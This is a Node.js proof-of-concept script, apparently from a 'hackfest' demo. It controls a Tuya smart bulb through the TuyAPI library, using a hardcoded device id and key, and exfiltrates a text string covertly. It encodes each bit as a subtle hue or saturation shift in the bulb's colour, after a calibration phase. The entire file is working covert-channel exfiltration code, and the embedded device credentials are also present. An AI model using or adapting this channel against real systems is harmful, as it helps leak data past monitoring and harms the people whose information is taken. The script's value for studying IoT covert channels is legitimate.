const TuyAPI = require('tuyapi');
const chalk = require('chalk');

const bitsNumber=1;
const minSaturation=0.15;
const minHue=10;
const timeoutDuration=3000;
const stringToExfiltrate="The S in IoT stands for Security";

const device = new TuyAPI({
    name: 'hackfest',
    id: '810718072462ab145d2f',
    key: 'e8b381fb3da9c50a' }
);

console.log("Transmission settings:");
console.log("Number of transmitted bits at the same time: "+bitsNumber);
console.log("Saturation's variation: "+minSaturation+"/1");
console.log("Waiting time between every setting change: "+timeoutDuration+"ms");
console.log("String that will be exfiltrated: "+stringToExfiltrate);
console.log("")

function stringToBinary(str, spaceSeparatedOctets) {
    function zeroPad(num) {
        return "00000000".slice(String(num).length) + num;
    }

    return str.replace(/[\s\S]/g, function(str) {
        str = zeroPad(str.charCodeAt().toString(2));
        return !1 == spaceSeparatedOctets ? str : str + " "
    });
};

async function setColor(color){
    await device.set({dps:31,set:color}).then(() => {
        //console.log('device was changed');
    });
    // Otherwise we'll be stuck in an endless
    // loop of toggling the state.
    stateHasChanged = true;
}

function rgbToHsv(r, g, b) {
  r /= 255, g /= 255, b /= 255;

  var max = Math.max(r, g, b), min = Math.min(r, g, b);
  var h, s, v = max;

  var d = max - min;
  s = max == 0 ? 0 : d / max;

  if (max == min) {
    h = 0; // achromatic
  } else {
    switch (max) {
      case r: h = (g - b) / d + (g < b ? 6 : 0); break;
      case g: h = (b - r) / d + 2; break;
      case b: h = (r - g) / d + 4; break;
    }

    h /= 6;
  }

  return [ h, s, v ];
}

function hexToRgb(hex) {
  var result = /^([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
  return result ? {
    r: parseInt(result[1], 16),
    g: parseInt(result[2], 16),
    b: parseInt(result[3], 16)
  } : null;
}

function hsvToRgb(h, s, v) {
  var r, g, b;

  var i = Math.floor(h * 6);
  var f = h * 6 - i;
  var p = v * (1 - s);
  var q = v * (1 - f * s);
  var t = v * (1 - (1 - f) * s);

  switch (i % 6) {
    case 0: r = v, g = t, b = p; break;
    case 1: r = q, g = v, b = p; break;
    case 2: r = p, g = v, b = t; break;
    case 3: r = p, g = q, b = v; break;
    case 4: r = t, g = p, b = v; break;
    case 5: r = v, g = p, b = q; break;
  }

  return [ r * 255, g * 255, b * 255 ];
}

function componentToHex(c) {
  var hex = c.toString(16);
  return hex.length == 1 ? "0" + hex : hex;
}

function rgbToHex(r, g, b) {
  return componentToHex(r) + componentToHex(g) + componentToHex(b);
}

(async () => {
  await device.find();

  await device.connect();

// The color that was set for the purle demo
//  setColor('8732e1ffffffff');return;
// The color that was set for the red demo
//  setColor('ff0000ffffffff');return;
  let status = await device.get();
  let fullBaseRGB = await device.get({dps:'31'});
  var baseRgb=hexToRgb(fullBaseRGB.slice(0,6));
  var baseHsv=rgbToHsv(baseRgb['r'],baseRgb['g'],baseRgb['b']);
  console.log("Original color: "+chalk.bold.rgb(baseRgb['r'], baseRgb['g'], baseRgb['b'])(baseHsv));

  status = await device.get();

  var exfiltred=stringToBinary(stringToExfiltrate).replace(' ','').split('');
  //1=Red
  //2=Green
  //3=Blue
  var rgb;
  var hsv;
  var newHsv;
  var rgb,hsv;
  var sStateValues=[],sStateCounter=0;
  var newColor="";

  if(!rgb){
      rgb=Array.from(baseRgb);
      hsv=Array.from(baseHsv);
      if(hsv[1]*100<50){
        sStateValues.push(hsv[1]+minSaturation);
        sStateValues.push(hsv[1]+(minSaturation*2));
      }else{
        sStateValues.push(hsv[1]-(minSaturation));
        sStateValues.push(hsv[1]-(minSaturation*2));
      }
  }

  console.log("Starting the reconnaissance")
  var firstColor="";
  var firstColorRGB;
  var firstColorHSV;
  for(var i=0;i<Math.pow(2,bitsNumber);i++){
    newHsv=Array.from(baseHsv);
    for(var j=0;j<2;j++){
      newHsv[1]=sStateValues[sStateCounter];sStateCounter=(sStateCounter+1)%2;
      if(bitsNumber==1){
        if(i==0)newHsv[0]=baseHsv[0];
        else newHsv[0]=((((baseHsv[0]*360)+minHue)%360)/360);
      }
      newRgb=hsvToRgb(newHsv[0],newHsv[1],newHsv[2]);
      rgb=Array.from(newRgb);
      hsv=Array.from(newHsv);
      newColor=rgbToHex(Math.round(newRgb[0]),Math.round(newRgb[1]),Math.round(newRgb[2]))+'ffffffff';
      if(!firstColor){
        firstColor=newColor;
        firstColorRGB=newRgb;
        firstColorHSV=newHsv;
      }
      console.log(chalk.bold.rgb(newRgb[0], newRgb[1], newRgb[2])(newHsv));
      setColor(newColor);
      await new Promise(r => setTimeout(r, timeoutDuration));
    }
  }

  console.log("Terminating the reconnaissance")
  setColor(firstColor);
  await new Promise(r => setTimeout(r, timeoutDuration));
  sStateCounter=(sStateCounter+1)%2;

  console.log("Starting the data transmission")
  for(var i=0;i<exfiltred.length;i++){
    console.log("Encoding the bit: "+exfiltred[i]);
    if(exfiltred[i]=="0"){
      newHsv=Array.from(baseHsv);
      newHsv[1]=sStateValues[sStateCounter];sStateCounter=(sStateCounter+1)%2;
      newHsv[0]=baseHsv[0];
      newRgb=hsvToRgb(newHsv[0],newHsv[1],newHsv[2]);
      rgb=Array.from(newRgb);
      hsv=Array.from(newHsv);
      newColor=rgbToHex(Math.round(newRgb[0]),Math.round(newRgb[1]),Math.round(newRgb[2]))+'ffffffff';
      console.log(chalk.bold.rgb(newRgb[0], newRgb[1], newRgb[2])(newHsv));
      setColor(newColor);
    }else if(exfiltred[i]=="1"){
      newHsv=Array.from(baseHsv);
      newHsv[1]=sStateValues[sStateCounter];sStateCounter=(sStateCounter+1)%2;
      newHsv[0]=((((baseHsv[0]*360)+minHue)%360)/360);
      newRgb=hsvToRgb(newHsv[0],newHsv[1],newHsv[2]);
      rgb=Array.from(newRgb);
      hsv=Array.from(newHsv);
      newColor=rgbToHex(Math.round(newRgb[0]),Math.round(newRgb[1]),Math.round(newRgb[2]))+'ffffffff';
      console.log(chalk.bold.rgb(newRgb[0], newRgb[1], newRgb[2])(newHsv));
      setColor(newColor);
    }
    await new Promise(r => setTimeout(r, timeoutDuration));
  }
  console.log("Restoring the initial color: "+chalk.bold.rgb(baseRgb['r'], baseRgb['g'], baseRgb['b'])(baseHsv));
  setColor(fullBaseRGB);
  device.disconnect();
})();
